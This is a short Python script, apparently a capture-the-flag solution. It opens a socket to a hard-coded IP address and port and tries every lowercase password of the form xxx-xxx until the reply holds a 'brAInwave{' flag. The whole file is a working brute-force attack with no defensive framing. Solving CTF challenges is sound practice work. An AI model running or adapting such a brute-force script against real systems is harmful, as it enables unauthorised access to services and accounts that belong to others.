import socket
import time
import itertools

# Target server information
target_ip = "4.186.56.150"
target_port = 37824  # Use the identified open port

# Generate all combinations of passwords in the form XXX-XXX
def generate_passwords():
    letters = 'abcdefghijklmnopqrstuvwxyz'
    for part1 in itertools.product(letters, repeat=3):
        for part2 in itertools.product(letters, repeat=3):
            yield ''.join(part1) + '-' + ''.join(part2)

# Connect to the server and attempt to send passwords
def connect_and_attempt_passwords(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((target_ip, port))
            print(f"Connected to {target_ip} on port {port}.")

            for password in generate_passwords():
                print(f"Trying password: {password}")
                s.sendall((password + '\n').encode())  # Send the password followed by a newline
                time.sleep(0.5)  # Wait a bit before sending the next password
                response = s.recv(1024)  # Receive the server's response
                print(f"Response: {response.decode().strip()}")

                # Check if the response contains the flag
                if b'brAInwave{' in response:  # Look for the start of the flag
                    print(f"Flag found: {response.decode().strip()}")
                    break
        except Exception as e:
            print(f"Could not connect to port {port}: {e}")

# Main execution
if __name__ == "__main__":
    connect_and_attempt_passwords(target_port)
